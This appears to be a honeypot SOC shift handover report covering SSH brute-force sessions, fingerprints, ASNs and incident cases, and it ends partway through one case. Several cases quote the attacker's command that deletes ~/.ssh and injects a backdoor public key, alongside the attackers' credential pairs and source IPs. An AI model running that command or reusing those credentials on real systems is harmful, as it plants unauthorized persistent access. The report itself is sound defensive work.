# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-19 |
| **Generated At** | 2026-04-19T06:01:09Z |
| **Shift Time** | 06:01 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **102** |
| Confirmed Threats | **100** |
| False Positives Filtered | **2** (2.0%) |
| Unique Attacker IPs | **21** |
| Countries of Origin | **11** |
| High Severity Cases | **37** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **65** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **78** |
| Unique Credential Pairs | **41** |
| Unique Usernames | **20** |
| Unique Passwords | **41** |
| Successful Auth Pairs | **25** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 37 |
| `345gs5662d34` | 18 |
| `oracle` | 3 |
| `ubuntu` | 2 |
| `user` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 18 |
| `3245gs5662d34` | 18 |
| `Root999#` | 2 |
| `qq123456.` | 2 |
| `asd` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 18 |
| `root` | `3245gs5662d34` | 18 |
| `root` | `Root999#` | 2 |
| `root` | `qq123456.` | 2 |
| `root` | `asd` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Qwer2222` | `114.130.85.36` | 2026-04-19T03:18:50 |
| `root` | `3245gs5662d34` | `114.130.85.36` | 2026-04-19T03:18:53 |
| `root` | `qwert1234!` | `114.130.85.36` | 2026-04-19T03:24:43 |
| `root` | `a@123456b` | `114.130.85.36` | 2026-04-19T03:36:03 |
| `root` | `Root999#` | `82.152.132.24` | 2026-04-19T04:21:23 |
| `root` | `3245gs5662d34` | `82.152.132.24` | 2026-04-19T04:21:27 |
| `root` | `qq123456.` | `103.113.104.43` | 2026-04-19T04:22:38 |
| `root` | `3245gs5662d34` | `103.113.104.43` | 2026-04-19T04:22:40 |
| `root` | `asd` | `35.225.56.202` | 2026-04-19T04:22:57 |
| `root` | `3245gs5662d34` | `35.225.56.202` | 2026-04-19T04:23:02 |
| `root` | `Root999#` | `43.165.176.201` | 2026-04-19T04:25:32 |
| `root` | `3245gs5662d34` | `43.165.176.201` | 2026-04-19T04:25:36 |
| `root` | `admin@321` | `103.179.27.94` | 2026-04-19T04:27:00 |
| `root` | `3245gs5662d34` | `103.179.27.94` | 2026-04-19T04:27:03 |
| `root` | `asd` | `103.179.27.94` | 2026-04-19T04:28:59 |
| `root` | `root2026@#` | `103.179.27.94` | 2026-04-19T04:30:51 |
| `root` | `XXzz123` | `103.179.27.94` | 2026-04-19T04:36:12 |
| `root` | `debian` | `120.48.82.124` | 2026-04-19T04:37:46 |
| `root` | `Qw12345678` | `103.179.27.94` | 2026-04-19T04:48:39 |
| `root` | `hesoyam` | `103.179.27.94` | 2026-04-19T04:50:24 |
| `root` | `qqAA112233` | `103.179.27.94` | 2026-04-19T04:52:09 |
| `root` | `qq123456.` | `103.179.27.94` | 2026-04-19T05:02:54 |
| `root` | `1020254050` | `103.179.27.94` | 2026-04-19T05:04:40 |
| `root` | `123456..` | `103.179.27.94` | 2026-04-19T05:06:30 |
| `root` | `Qwe!` | `103.179.27.94` | 2026-04-19T05:08:21 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **102** |
| Sessions with Fingerprint | **7** |
| Unique HASSH Fingerprints | **7** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 75 |
| Go SSH scanner | 11 |
| Paramiko (Python) | 1 |
| OpenSSH | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 75 | 6 |
| `084386fa7ae5...` | Mirai/variant | 3 | 3 |
| `0a07365cc01f...` | Generic scanner | 1 | 1 |
| `98ddc5604ef6...` | Modern SSH client | 1 | 1 |
| `a704be057881...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 75 | 6 | Modern SSH client |
| `95420f9d932d...` | Go SSH scanner | 6 | 3 | — |
| `084386fa7ae5...` | Go SSH scanner | 3 | 3 | Mirai/variant |
| `0a07365cc01f...` | Go SSH scanner | 1 | 1 | Generic scanner |
| `98ddc5604ef6...` | Go SSH scanner | 1 | 1 | Modern SSH client |
| `a704be057881...` | Paramiko (Python) | 1 | 1 | Mirai/variant |
| `c118de82e19e...` | OpenSSH | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 18 | 6 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `82.152.132.24`, `114.130.85.36`, `43.165.176.201`, `103.113.104.43`, `103.179.27.94`, `35.225.56.202`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **21** |
| Unique ASNs | **18** |
| High-Risk ASNs | **17** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS213790` | Limited Network LTD | 3 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS149333` | PT Primadona Media Digitalindo | 1 | HIGH |
| `AS16509` | Amazon.com, Inc. | 1 | HIGH |
| `AS3301` | Telia Company AB | 1 | LOW |
| `AS132203` | Tencent Building, Kejizhongyi Avenue | 1 | HIGH |
| `AS138718` | Ekowebtech It Services Pvt Ltd | 1 | HIGH |
| `AS9824` | JCOM Co., Ltd. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (37)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-82c3e7daf170

| Field | Detail |
|---|---|
| **Source IP** | `114.130.85[.]36` |
| **First Seen** | 2026-04-19 03:18 |
| **Last Seen** | 2026-04-19 03:18 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 03:18:49` | `cowrie.session.connect` |
| `2026-04-19 03:18:49` | `cowrie.client.version` |
| `2026-04-19 03:18:49` | `cowrie.client.kex` |
| `2026-04-19 03:18:50` | `cowrie.login.success` |
| `2026-04-19 03:18:50` | `cowrie.session.params` |
| `2026-04-19 03:18:50` | `cowrie.command.input` |
| `2026-04-19 03:18:50` | `cowrie.command.failed` |
| `2026-04-19 03:18:50` | `cowrie.log.closed` |
| `2026-04-19 03:18:50` | `cowrie.session.params` |
| `2026-04-19 03:18:50` | `cowrie.command.input` |
| `2026-04-19 03:18:50` | `cowrie.session.file_download` |
| `2026-04-19 03:18:50` | `cowrie.log.closed` |
| `2026-04-19 03:18:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.130.85[.]36` to AbuseIPDB if not already reported
- [ ] Block `114.130.85[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1c2f0f56c1ef

| Field | Detail |
|---|---|
| **Source IP** | `114.130.85[.]36` |
| **First Seen** | 2026-04-19 03:18 |
| **Last Seen** | 2026-04-19 03:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 03:18:52` | `cowrie.session.connect` |
| `2026-04-19 03:18:52` | `cowrie.client.version` |
| `2026-04-19 03:18:52` | `cowrie.client.kex` |
| `2026-04-19 03:18:53` | `cowrie.login.success` |
| `2026-04-19 03:18:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.130.85[.]36` to AbuseIPDB if not already reported
- [ ] Block `114.130.85[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-90037b3bcd30

| Field | Detail |
|---|---|
| **Source IP** | `114.130.85[.]36` |
| **First Seen** | 2026-04-19 03:24 |
| **Last Seen** | 2026-04-19 03:24 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 03:24:43` | `cowrie.session.connect` |
| `2026-04-19 03:24:43` | `cowrie.client.version` |
| `2026-04-19 03:24:43` | `cowrie.client.kex` |
| `2026-04-19 03:24:43` | `cowrie.login.success` |
| `2026-04-19 03:24:44` | `cowrie.session.params` |
| `2026-04-19 03:24:44` | `cowrie.command.input` |
| `2026-04-19 03:24:44` | `cowrie.command.failed` |
| `2026-04-19 03:24:44` | `cowrie.log.closed` |
| `2026-04-19 03:24:44` | `cowrie.session.params` |
| `2026-04-19 03:24:44` | `cowrie.command.input` |
| `2026-04-19 03:24:44` | `cowrie.session.file_download` |
| `2026-04-19 03:24:44` | `cowrie.log.closed` |
| `2026-04-19 03:24:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.130.85[.]36` to AbuseIPDB if not already reported
- [ ] Block `114.130.85[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6fabdd73a65f

| Field | Detail |
|---|---|
| **Source IP** | `114.130.85[.]36` |
| **First Seen** | 2026-04-19 03:24 |
| **Last Seen** | 2026-04-19 03:24 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 03:24:46` | `cowrie.session.connect` |
| `2026-04-19 03:24:46` | `cowrie.client.version` |
| `2026-04-19 03:24:46` | `cowrie.client.kex` |
| `2026-04-19 03:24:47` | `cowrie.login.success` |
| `2026-04-19 03:24:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.130.85[.]36` to AbuseIPDB if not already reported
- [ ] Block `114.130.85[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6e23bba6130f

| Field | Detail |
|---|---|
| **Source IP** | `114.130.85[.]36` |
| **First Seen** | 2026-04-19 03:36 |
| **Last Seen** | 2026-04-19 03:36 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 03:36:02` | `cowrie.session.connect` |
| `2026-04-19 03:36:02` | `cowrie.client.version` |
| `2026-04-19 03:36:02` | `cowrie.client.kex` |
| `2026-04-19 03:36:03` | `cowrie.login.success` |
| `2026-04-19 03:36:03` | `cowrie.session.params` |
| `2026-04-19 03:36:03` | `cowrie.command.input` |
| `2026-04-19 03:36:03` | `cowrie.command.failed` |
| `2026-04-19 03:36:03` | `cowrie.log.closed` |
| `2026-04-19 03:36:03` | `cowrie.session.params` |
| `2026-04-19 03:36:03` | `cowrie.command.input` |
| `2026-04-19 03:36:03` | `cowrie.session.file_download` |
| `2026-04-19 03:36:03` | `cowrie.log.closed` |
| `2026-04-19 03:36:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.130.85[.]36` to AbuseIPDB if not already reported
- [ ] Block `114.130.85[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64b8e455ad85

| Field | Detail |
|---|---|
| **Source IP** | `114.130.85[.]36` |
| **First Seen** | 2026-04-19 03:36 |
| **Last Seen** | 2026-04-19 03:36 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 03:36:05` | `cowrie.session.connect` |
| `2026-04-19 03:36:05` | `cowrie.client.version` |
| `2026-04-19 03:36:05` | `cowrie.client.kex` |
| `2026-04-19 03:36:06` | `cowrie.login.success` |
| `2026-04-19 03:36:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.130.85[.]36` to AbuseIPDB if not already reported
- [ ] Block `114.130.85[.]36` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fa2292f19dae

| Field | Detail |
|---|---|
| **Source IP** | `82.152.132[.]24` |
| **First Seen** | 2026-04-19 04:21 |
| **Last Seen** | 2026-04-19 04:21 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 04:21:23` | `cowrie.session.connect` |
| `2026-04-19 04:21:23` | `cowrie.client.version` |
| `2026-04-19 04:21:23` | `cowrie.client.kex` |
| `2026-04-19 04:21:23` | `cowrie.login.success` |
| `2026-04-19 04:21:24` | `cowrie.session.params` |
| `2026-04-19 04:21:24` | `cowrie.command.input` |
| `2026-04-19 04:21:24` | `cowrie.command.failed` |
| `2026-04-19 04:21:24` | `cowrie.log.closed` |
| `2026-04-19 04:21:24` | `cowrie.session.params` |
| `2026-04-19 04:21:24` | `cowrie.command.input` |
| `2026-04-19 04:21:24` | `cowrie.session.file_download` |
| `2026-04-19 04:21:24` | `cowrie.log.closed` |
| `2026-04-19 04:21:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `82.152.132[.]24` to AbuseIPDB if not already reported
- [ ] Block `82.152.132[.]24` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-51df25c9e760

| Field | Detail |
|---|---|
| **Source IP** | `82.152.132[.]24` |
| **First Seen** | 2026-04-19 04:21 |
| **Last Seen** | 2026-04-19 04:21 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 04:21:27` | `cowrie.session.connect` |
| `2026-04-19 04:21:27` | `cowrie.client.version` |
| `2026-04-19 04:21:27` | `cowrie.client.kex` |
| `2026-04-19 04:21:27` | `cowrie.login.success` |
| `2026-04-19 04:21:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `82.152.132[.]24` to AbuseIPDB if not already reported
- [ ] Block `82.152.132[.]24` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b824e20ca7d

| Field | Detail |
|---|---|
| **Source IP** | `103.113.104[.]43` |
| **First Seen** | 2026-04-19 04:22 |
| **Last Seen** | 2026-04-19 04:22 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 04:22:37` | `cowrie.session.connect` |
| `2026-04-19 04:22:37` | `cowrie.client.version` |
| `2026-04-19 04:22:37` | `cowrie.client.kex` |
| `2026-04-19 04:22:38` | `cowrie.login.success` |
| `2026-04-19 04:22:38` | `cowrie.session.params` |
| `2026-04-19 04:22:38` | `cowrie.command.input` |
| `2026-04-19 04:22:38` | `cowrie.command.failed` |
| `2026-04-19 04:22:38` | `cowrie.log.closed` |
| `2026-04-19 04:22:38` | `cowrie.session.params` |
| `2026-04-19 04:22:38` | `cowrie.command.input` |
| `2026-04-19 04:22:38` | `cowrie.session.file_download` |
| `2026-04-19 04:22:38` | `cowrie.log.closed` |
| `2026-04-19 04:22:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.113.104[.]43` to AbuseIPDB if not already reported
- [ ] Block `103.113.104[.]43` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a0fd170208d

| Field | Detail |
|---|---|
| **Source IP** | `103.113.104[.]43` |
| **First Seen** | 2026-04-19 04:22 |
| **Last Seen** | 2026-04-19 04:22 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 04:22:39` | `cowrie.session.connect` |
| `2026-04-19 04:22:39` | `cowrie.client.version` |
| `2026-04-19 04:22:39` | `cowrie.client.kex` |
| `2026-04-19 04:22:40` | `cowrie.login.success` |
| `2026-04-19 04:22:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.113.104[.]43` to AbuseIPDB if not already reported
- [ ] Block `103.113.104[.]43` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67f211634794

| Field | Detail |
|---|---|
| **Source IP** | `35.225.56[.]202` |
| **First Seen** | 2026-04-19 04:22 |
| **Last Seen** | 2026-04-19 04:23 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 04:22:56` | `cowrie.session.connect` |
| `2026-04-19 04:22:56` | `cowrie.client.version` |
| `2026-04-19 04:22:56` | `cowrie.client.kex` |
| `2026-04-19 04:22:57` | `cowrie.login.success` |
| `2026-04-19 04:22:57` | `cowrie.session.params` |
| `2026-04-19 04:22:57` | `cowrie.command.input` |
| `2026-04-19 04:22:57` | `cowrie.command.failed` |
| `2026-04-19 04:22:58` | `cowrie.log.closed` |
| `2026-04-19 04:22:58` | `cowrie.session.params` |
| `2026-04-19 04:22:58` | `cowrie.command.input` |
| `2026-04-19 04:22:58` | `cowrie.session.file_download` |
| `2026-04-19 04:22:58` | `cowrie.log.closed` |
| `2026-04-19 04:23:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.225.56[.]202` to AbuseIPDB if not already reported
- [ ] Block `35.225.56[.]202` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16358555a6cb

| Field | Detail |
|---|---|
| **Source IP** | `35.225.56[.]202` |
| **First Seen** | 2026-04-19 04:23 |
| **Last Seen** | 2026-04-19 04:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-19 04:23:01` | `cowrie.session.connect` |
| `2026-04-19 04:23:01` | `cowrie.client.version` |
| `2026-04-19 04:23:02` | `cowrie.client.kex` |
| `2026-04-19 04:23:02` | `cowrie.login.success` |
| `2026-04-19 04:23:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `35.225.56[.]202` to AbuseIPDB if not already reported
- [ ] Block `35.225.56[.]202` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8687c51cd8a9

| Field | Detail |
|---|---|
| **Source IP** | `43.165.176[.]201` |
| **First Seen** | 2026-04-19 04:25 |
| **Last Seen** | 2026-04-19 04:25 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
